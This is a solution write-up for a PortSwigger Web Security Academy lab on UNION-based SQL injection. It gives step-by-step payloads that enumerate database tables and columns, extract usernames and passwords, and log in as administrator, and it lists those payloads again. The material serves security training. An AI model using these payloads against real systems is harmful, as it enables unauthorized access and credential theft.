## SQL injection attack, listing the database contents on non-Oracle databases

**Category:** sqli
**Difficulty:** Medium

### Description
This lab contains a SQL injection vulnerability in the product category filter. The results from the query are returned in the application's response so you can use a UNION attack to retrieve data from other tables.

### Solution Steps
1. Identify the injection point in the category parameter
2. Determine the number of columns with NULL injection: `'+UNION+SELECT+NULL,NULL--`
3. If two columns work, test which accept strings: `'+UNION+SELECT+'abc','def'--`
4. Query information_schema to enumerate tables:
5. `'+UNION+SELECT+table_name,+NULL+FROM+information_schema.tables--`
6. Find the users table (may have random suffix like users_abcdef)
7. Query columns in the users table:
8. `'+UNION+SELECT+column_name,+NULL+FROM+information_schema.columns+WHERE+table_name='users_abcdef'--`
9. Find username and password columns (may have suffixes)
10. Extract credentials:
11. `'+UNION+SELECT+username_abcdef,+password_abcdef+FROM+users_abcdef--`
12. Login as administrator with extracted password

### Key Payloads
- `administrator`
- `category`
- `'+UNION+SELECT+NULL,NULL--`
- `'+UNION+SELECT+'abc','def'--`
- `'+UNION+SELECT+table_name,+NULL+FROM+information_schema.tables--`
- `'+UNION+SELECT+column_name,+NULL+FROM+information_schema.columns+WHERE+table_name='users_abcdef'--`
- `'+UNION+SELECT+username_abcdef,+password_abcdef+FROM+users_abcdef--`

### Indicators of Success
- UNION SELECT returns data in response
- Table names visible from information_schema
- Column names extracted from target table
- Username and password retrieved
- Administrator login successful

---
*Source: PortSwigger Web Security Academy*
